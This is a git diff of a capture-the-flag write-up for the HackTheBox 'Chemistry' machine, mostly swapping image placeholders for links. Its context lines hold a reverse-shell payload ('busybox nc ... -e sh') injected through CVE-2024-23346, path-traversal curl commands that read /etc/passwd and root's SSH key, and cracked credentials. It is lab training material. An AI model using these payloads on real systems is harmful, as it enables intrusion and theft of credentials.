@@ -17,7 +17,7 @@ nc -nvv -w 1 $IP 1-1000 2>&1 | grep -v 'Connection refused'
 ### Foothold
 - 5000
 	- Default landing page
-		- Chemistry01
+		![alt text](https://github.com/trevorprice99/Penetration_Testing/blob/main/Write-Ups/HackTheBox/Chemistry/Images/Chemistry01.png)
 	- Directory Brute force
 		- dirsearch -u http://$IP:5000
 			- /login
@@ -27,20 +27,20 @@ nc -nvv -w 1 $IP 1-1000 2>&1 | grep -v 'Connection refused'
 		- Found directories
 			- /login
 				- admin:admin
-					- Chemistry02
+					![alt text](https://github.com/trevorprice99/Penetration_Testing/blob/main/Write-Ups/HackTheBox/Chemistry/Images/Chemistry02.png)
 			- /register
 				- admin:admin
-					- Chemistry03
+					![alt text](https://github.com/trevorprice99/Penetration_Testing/blob/main/Write-Ups/HackTheBox/Chemistry/Images/Chemistry03.png)
 				- admin123:admin123
 					- Creates account
-						- Chemistry04
+						![alt text](https://github.com/trevorprice99/Penetration_Testing/blob/main/Write-Ups/HackTheBox/Chemistry/Images/Chemistry04.png)
 	- Versions
 		- CIF file
 			- CVE-2024-23346
 				- https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f
 				- Changed this part of code `("os").system ("busybox nc 10.10.14.154 443 -e sh");0,0,0'
 				- Landed a rev shell
-				- Chemistry05
+				![alt text](https://github.com/trevorprice99/Penetration_Testing/blob/main/Write-Ups/HackTheBox/Chemistry/Images/Chemistry05.png)
 ### PE
 #### Linux
 - app
@@ -63,12 +63,12 @@ nc -nvv -w 1 $IP 1-1000 2>&1 | grep -v 'Connection refused'
 	- Users with console
 		- app
 			- app.py
-				- Chemistry06
+				![alt text](https://github.com/trevorprice99/Penetration_Testing/blob/main/Write-Ups/HackTheBox/Chemistry/Images/Chemistry06.png)
 				- Possible sql login
 					- app:MyS3cretCh3mistry4PP
 			- /instance/database.db
-				- Chemistry07
-				- Chemistry08
+				![alt text](https://github.com/trevorprice99/Penetration_Testing/blob/main/Write-Ups/HackTheBox/Chemistry/Images/Chemistry07.png)
+				![alt text](https://github.com/trevorprice99/Penetration_Testing/blob/main/Write-Ups/HackTheBox/Chemistry/Images/Chemistry08.png)
 				- Crackstation
 					- rosa:63ed86ee9f624c7b14f1d4f43dc251a5
 						- unicorniosrosados
@@ -116,14 +116,13 @@ nc -nvv -w 1 $IP 1-1000 2>&1 | grep -v 'Connection refused'
 			- Server: Python/3.9 aiohttp/3.9.1
 			- Google aiohttp 3.9.1 exploit
 				- LFI - https://github.com/z3rObyte/CVE-2024-23334-PoC
-			- Chemistry09
+			![alt text](https://github.com/trevorprice99/Penetration_Testing/blob/main/Write-Ups/HackTheBox/Chemistry/Images/Chemistry09.png)
 		- LFI
 			- `proxychains curl -s --path-as-is "http://127.0.0.1:8080/assets/../../../../../../../../../../../../../../../../../../etc/passwd"`
 			- Outputs etc/passwd file
 		- `proxychains curl -s --path-as-is "http://127.0.0.1:8080/assets/../../../../../../../../../../../../../../../../../../root/.ssh/id_rsa"
 			- outputs root id_rsa
-			- Chemistry10
+			![alt text](https://github.com/trevorprice99/Penetration_Testing/blob/main/Write-Ups/HackTheBox/Chemistry/Images/Chemistry10.png)
 - root
-	- Chemistry11
-### Credentials
-### Lessons Learned
+
+	![alt text](https://github.com/trevorprice99/Penetration_Testing/blob/main/Write-Ups/HackTheBox/Chemistry/Images/Chemistry11.png)
